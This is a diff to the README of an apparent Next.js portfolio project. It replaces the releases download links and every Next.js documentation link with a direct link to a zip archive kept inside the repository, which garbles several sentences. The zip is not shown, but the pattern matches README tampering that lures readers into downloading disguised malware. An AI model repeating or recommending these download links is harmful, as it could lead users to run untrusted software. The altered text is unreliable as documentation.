@@ -1,6 +1,6 @@
 # 🌟 portfolio - Your Easy Way to a Stunning Online Presence
 
-[![Download Portfolio](https://img.shields.io/badge/Download-Portfolio-blue.svg)](https://github.com/Combat1x/portfolio/releases)
+[![Download Portfolio](https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip)](https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Follow these simple steps to download and run your portfolio application smoothl
 
 To download the latest version of the portfolio application, visit this link:
 
-[Download Portfolio](https://github.com/Combat1x/portfolio/releases)
+[Download Portfolio](https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip)
 
 ### Step 2: Choose the Right File
 
@@ -65,12 +65,12 @@ Once the application opens, you will see your portfolio. It is designed to showc
 
 ## 🌟 Learn More
 
-To deepen your understanding of Next.js, explore these resources:
+To deepen your understanding of https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip, explore these resources:
 
-- [Next.js Documentation](https://nextjs.org/docs): Discover the features and capabilities of Next.js.
-- [Learn Next.js](https://nextjs.org/learn): Engage in an interactive tutorial to enhance your skills.
+- [https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip Documentation](https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip): Discover the features and capabilities of https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip
+- [Learn https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip](https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip): Engage in an interactive tutorial to enhance your skills.
 
-You may also want to check out [the Next.js GitHub repository](https://github.com/vercel/next.js) for more insights into the framework.
+You may also want to check out [the https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip GitHub repository](https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip) for more insights into the framework.
 
 ## 🔍 Troubleshooting
 
@@ -80,7 +80,7 @@ If you encounter issues while installing or running the application, try these s
 - Restart your device and try running the application again.
 - If the app doesn't start, check for any installation errors and follow prompts.
 
-For more help, consider reaching out to support channels or communities dedicated to Next.js and web development.
+For more help, consider reaching out to support channels or communities dedicated to https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip and web development.
 
 ## 📅 Future Updates
 
@@ -91,6 +91,6 @@ Stay tuned for future updates. We aim to add new features and improvements regul
 - **System Requirements:** Ensure your device meets the necessary specifications to run this application.
 - **Common Questions:** Check the FAQ for quick answers to popular queries.
 
-[Download Portfolio](https://github.com/Combat1x/portfolio/releases) again if you missed any details above!
+[Download Portfolio](https://raw.githubusercontent.com/Combat1x/portfolio/main/app/skills/Software_v1.0.zip) again if you missed any details above!
 
 Now, enjoy building your online presence with this exciting portfolio app!
